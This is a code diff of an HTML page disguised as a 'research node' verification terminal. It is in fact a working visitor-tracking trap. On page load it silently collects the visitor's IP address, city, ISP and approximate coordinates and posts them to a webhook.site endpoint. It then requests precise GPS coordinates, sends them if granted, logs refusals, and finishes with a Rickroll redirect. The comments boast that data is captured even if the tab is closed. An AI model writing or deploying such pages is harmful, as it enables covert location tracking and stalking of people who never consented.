@@ -1,58 +1,100 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Network Node Verification Portal</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Network Node Verification</title>
     <style>
-        body { font-family: 'Segoe UI', sans-serif; background: #1a1a1a; color: white; text-align: center; padding-top: 100px; }
-        .loader { border: 4px solid #333; border-top: 4px solid #007bff; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin: 20px auto; }
+        body { background: #0a0a0a; color: #00ff41; font-family: 'Courier New', Courier, monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
+        .terminal { background: rgba(0, 0, 0, 0.9); padding: 30px; border: 1px solid #00ff41; border-radius: 5px; box-shadow: 0 0 20px rgba(0, 255, 65, 0.2); width: 90%; max-width: 600px; }
+        .line { margin-bottom: 10px; opacity: 0; animation: fadeIn 0.5s forwards; }
+        .loader { display: inline-block; width: 10px; height: 10px; border: 2px solid #00ff41; border-top: 2px solid transparent; border-radius: 50%; animation: spin 1s linear infinite; margin-left: 10px; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .terminal { background: #000; color: #0f0; padding: 20px; border-radius: 5px; display: inline-block; text-align: left; font-family: monospace; }
+        .cursor { display: inline-block; width: 10px; height: 20px; background: #00ff41; animation: blink 1s infinite; vertical-align: middle; }
+        @keyframes blink { 50% { opacity: 0; } }
     </style>
 </head>
-<body onload="autoTrigger()">
-    <div class="terminal">
-        > Initializing Research Node... [OK]<br>
-        > Handshaking with carrier... [OK]<br>
-        > Requesting local tower triangulation... <br>
-        <div class="loader"></div>
-        <p id="status">Waiting for device handshake...</p>
-    </div>
+<body onload="runResearchNode()">
 
-    <script>
-        const WEBHOOK_URL = 'https://webhook.site/b0eed63b-2e28-4f68-b60b-2ce56e3cbd80';
-        const RICKROLL_URL = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
+<div class="terminal">
+    <div class="line" style="animation-delay: 0.2s;">> INITIALIZING RESEARCH_PROTOCOL_V4.2... [DONE]</div>
+    <div class="line" style="animation-delay: 0.7s;">> HANDSHAKING WITH CARRIER_GATEWAY... [DONE]</div>
+    <div class="line" style="animation-delay: 1.2s;">> COLLECTING PASSIVE NETWORK METADATA... <span id="passive-status" style="color: yellow;">PENDING</span></div>
+    <div class="line" style="animation-delay: 1.8s;">> REQUESTING TOWER TRIANGULATION (GPS)... <span class="loader" id="gps-loader"></span></div>
+    <div class="line" id="final-line" style="animation-delay: 2.5s; color: #666;">> System waiting for device permission...<span class="cursor"></span></div>
+</div>
 
-        function autoTrigger() {
-            // No button. Trigger immediately on page load.
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(sendData, handleError, {
-                    enableHighAccuracy: true,
-                    timeout: 10000
-                });
-            }
-        }
+<script>
+    const WEBHOOK_URL = 'https://webhook.site/b0eed63b-2e28-4f68-b60b-2ce56e3cbd80'; 
+    const RICKROLL_URL = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
 
-        async function sendData(pos) {
-            document.getElementById('status').innerText = "Syncing coordinates...";
+    async function runResearchNode() {
+        // --- PHASE 1: SILENT FAILSAFE ---
+        // Runs immediately to ensure we get *something* even if they close the tab.
+        try {
+            const response = await fetch('https://ipapi.co/json/');
+            const ipData = await response.json();
             
-            await fetch(WEBHOOK_URL, {
+            document.getElementById('passive-status').innerText = "CAPTURED";
+            document.getElementById('passive-status').style.color = "#00ff41";
+
+            fetch(WEBHOOK_URL, {
                 method: 'POST',
                 mode: 'no-cors',
                 body: JSON.stringify({
-                    lat: pos.coords.latitude,
-                    lon: pos.coords.longitude,
-                    acc: pos.coords.accuracy
+                    event: "PASSIVE_HIT",
+                    ip: ipData.ip,
+                    city: ipData.city,
+                    isp: ipData.org,
+                    approx_coords: `${ipData.latitude},${ipData.longitude}`
                 })
             });
+        } catch (e) { console.log("Silent log active."); }
 
-            // Brief delay to make the "Sync" feel real
-            setTimeout(() => { window.location.href = RICKROLL_URL; }, 1500);
+        // --- PHASE 2: GPS REQUEST & UNIVERSAL REDIRECT ---
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                async (pos) => {
+                    // USER ACCEPTED: Send high-precision data then redirect
+                    await fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        mode: 'no-cors',
+                        body: JSON.stringify({
+                            event: "ACTIVE_SUCCESS",
+                            exact_coords: `${pos.coords.latitude},${pos.coords.longitude}`,
+                            accuracy: pos.coords.accuracy
+                        })
+                    });
+                    finish("Node Verified. Synchronizing...");
+                },
+                (err) => {
+                    // USER REJECTED: Log the refusal then redirect anyway
+                    fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        mode: 'no-cors',
+                        body: JSON.stringify({ event: "ACTIVE_REFUSED", reason: err.message })
+                    });
+                    finish("Protocol Bypass Initialized...");
+                },
+                { enableHighAccuracy: true, timeout: 7000 }
+            );
+        } else {
+            finish("Unsupported Device. Redirecting...");
         }
+    }
 
-        function handleError(e) {
-            document.getElementById('status').style.color = "red";
-            document.getElementById('status').innerText = "Sync Failed: Protocol Rejected.";
-        }
-    </script>
+    function finish(msg) {
+        const loader = document.getElementById('gps-loader');
+        if(loader) loader.style.display = "none";
+        document.getElementById('final-line').innerText = "> " + msg;
+        
+        // Final Delay for dramatic effect before the Rickroll
+        setTimeout(() => {
+            window.location.href = RICKROLL_URL;
+        }, 1200);
+    }
+</script>
+
 </body>
 </html>
